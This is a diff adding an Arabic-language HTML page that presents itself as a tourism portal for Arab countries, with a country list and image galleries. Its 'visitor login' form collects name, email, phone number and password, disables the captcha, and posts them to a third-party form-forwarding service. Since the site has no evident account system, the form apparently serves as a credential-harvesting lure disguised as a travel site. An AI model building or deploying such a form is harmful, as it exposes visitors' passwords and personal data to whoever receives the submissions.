@@ -1,0 +1,166 @@
+<!DOCTYPE html><html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>بوابة الدول العربية السياحية</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Cairo', sans-serif;
+      background-color: #f0f0f0;
+      margin: 0;
+      padding: 0;
+      direction: rtl;
+    }
+    header {
+      background-color: #004d7a;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    main {
+      padding: 30px;
+    }
+    section {
+      margin-bottom: 40px;
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .country {
+      border-bottom: 1px solid #ccc;
+      padding: 10px 0;
+    }
+    .country:last-child {
+      border-bottom: none;
+    }
+    .country h2 {
+      margin-top: 0;
+      color: #007bff;
+    }
+    .country p {
+      margin: 5px 0;
+    }
+    .more-btn {
+      background-color: #007bff;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .more-btn:hover {
+      background-color: #0056b3;
+    }
+    form {
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 600px;
+      margin: 0 auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #28a745;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+    footer {
+      text-align: center;
+      margin-top: 50px;
+      font-size: 14px;
+      color: gray;
+      padding-bottom: 20px;
+    }
+    .gallery {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .gallery img {
+      width: 100px;
+      height: 100px;
+      object-fit: cover;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>بوابة السياحة للدول العربية</h1>
+    <p>استكشف أهم الوجهات في العالم العربي</p>
+  </header>  <main>
+    <section>
+      <h2>تسجيل دخول الزوار</h2>
+      <form action="https://formsubmit.co/el/cexuta" method="POST">
+        <input type="text" name="الاسم الكامل" placeholder="الاسم الكامل" required>
+        <input type="email" name="البريد الإلكتروني" placeholder="البريد الإلكتروني" required>
+        <input type="tel" name="رقم الهاتف" placeholder="رقم الهاتف" required>
+        <input type="password" name="كلمة المرور" placeholder="كلمة المرور" required>
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://the311.github.io/thanks.html">
+        <button type="submit">تسجيل</button>
+      </form>
+    </section><section>
+  <h2>الدول العربية</h2>
+  <div id="countries"></div>
+</section>
+
+  </main>  <footer>
+    &copy; 2025 جميع الحقوق محفوظة | بوابة السياحة العربية
+  </footer>  <script>
+    const countries = [
+      { nameAr: "السعودية", nameEn: "Saudi Arabia", rank: "أكبر اقتصاد عربي" },
+      { nameAr: "الإمارات", nameEn: "UAE", rank: "ثاني أكبر اقتصاد ونمو سريع" },
+      { nameAr: "قطر", nameEn: "Qatar", rank: "أعلى دخل للفرد" },
+      { nameAr: "البحرين", nameEn: "Bahrain", rank: "مركز مالي متطور" },
+      { nameAr: "الكويت", nameEn: "Kuwait", rank: "ثروة نفطية ضخمة" },
+      { nameAr: "عُمان", nameEn: "Oman", rank: "تاريخ وتراث غني" },
+      { nameAr: "مصر", nameEn: "Egypt", rank: "أكبر عدد سكان" },
+      { nameAr: "لبنان", nameEn: "Lebanon", rank: "ثقافة وجمال طبيعي" },
+      { nameAr: "الأردن", nameEn: "Jordan", rank: "سياحة دينية وتاريخية" },
+      { nameAr: "تونس", nameEn: "Tunisia", rank: "سياحة متوسطية" },
+      { nameAr: "الجزائر", nameEn: "Algeria", rank: "مساحة ضخمة" },
+      { nameAr: "المغرب", nameEn: "Morocco", rank: "تنوع سياحي وثقافي" },
+      { nameAr: "العراق", nameEn: "Iraq", rank: "حضارة تاريخية" },
+      { nameAr: "سوريا", nameEn: "Syria", rank: "أرض التاريخ القديم" },
+      { nameAr: "اليمن", nameEn: "Yemen", rank: "مواقع تراثية فريدة" },
+      { nameAr: "ليبيا", nameEn: "Libya", rank: "ساحل طويل على المتوسط" },
+      { nameAr: "السودان", nameEn: "Sudan", rank: "حضارة نوبية" },
+      { nameAr: "فلسطين", nameEn: "Palestine", rank: "أرض الديانات السماوية" },
+      { nameAr: "موريتانيا", nameEn: "Mauritania", rank: "صحراء ساحرة" },
+      { nameAr: "جيبوتي", nameEn: "Djibouti", rank: "موقع استراتيجي" },
+      { nameAr: "الصومال", nameEn: "Somalia", rank: "إطلالة على المحيط الهندي" },
+      { nameAr: "جزر القمر", nameEn: "Comoros", rank: "جزر سياحية خلابة" }
+    ];
+
+    const container = document.getElementById("countries");
+
+    countries.forEach(country => {
+      const div = document.createElement("div");
+      div.className = "country";
+      div.innerHTML = `
+        <h2>${country.nameAr} (${country.nameEn})</h2>
+        <p>الترتيب: ${country.rank}</p>
+        <button class="more-btn" onclick="alert('يتم تحميل أفضل الصور والمناطق في ${country.nameAr}')">المزيد</button>
+        <div class="gallery">
+          ${Array.from({ length: 5 }).map((_, i) => `<img src='https://source.unsplash.com/200x200/?${country.nameEn},tourism&sig=${i}' alt='${country.nameAr}'>`).join('')}
+        </div>
+      `;
+      container.appendChild(div);
+    });
+  </script></body>
+</html>
